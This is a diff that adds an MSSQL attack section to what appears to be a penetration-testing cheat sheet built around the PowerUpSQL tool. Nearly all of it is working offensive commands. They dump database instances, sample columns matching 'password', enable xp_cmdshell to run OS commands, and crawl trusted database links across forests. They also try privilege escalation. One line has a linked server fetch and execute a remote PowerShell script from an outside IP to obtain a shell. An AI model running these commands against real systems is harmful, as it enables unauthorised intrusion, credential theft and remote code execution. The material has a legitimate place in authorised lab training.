@@ -103,6 +103,7 @@ If it returns 1, the user has admin privileges.
 # MSSQL Tool: PowerUpSQL
 
 Link: https://github.com/NetSPI/PowerUpSQL
+Cheatsheet: https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet
 
 Import Module
 
@@ -151,3 +152,59 @@ This looks for SPNs that starts with MSSQL (not always is a MSSQL running instan
 ##### 5)  Get DBs, test connections, and get info in oneliner
 
     Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
+
+### MSSQL Abuse
+
+#### 1) Perform an SQL query
+
+    Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
+
+#### 2) Dump an instance (a lotof CVSs generated in current dir)
+
+    Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
+
+#### 3) Search keywords in columns trying to access the MSSQL DBs. This won't use trusted SQL links
+
+    Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
+
+### MSSQL RCE
+
+#### 1) It might be also possible to execute commands inside the MSSQL host
+
+    Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
+
+Invoke-SQLOSCmd automatically checks if xp_cmdshell is enabled and enables it if necessary
+
+### MSSQL Trusted Links
+
+If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to use the trust relationship to execute queries also in the other instance. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
+
+TIP: The links between databases work even across forest trusts.
+
+#### 1) Look for MSSQL links of an accessible instance
+
+    Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
+
+#### 2) Crawl trusted links, starting form the given one (the user being used by the MSSQL instance is also specified)
+
+    Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose
+
+#### 3) If you are sysadmin in some trusted link you can enable xp_cmdshell with:
+
+    Get-SQLServerLinkCrawl -instance "<INSTANCE1>" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "<INSTANCE2>"'
+
+#### 4) Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field
+
+    Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query "exec master..xp_cmdshell 'whoami'"
+
+#### 5) Obtain a shell
+
+    Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')"'
+
+#### 6) Check for possible vulnerabilities on an instance where you have access
+
+    Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"
+
+#### 7) Try to escalate privileges on an instance
+
+    Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
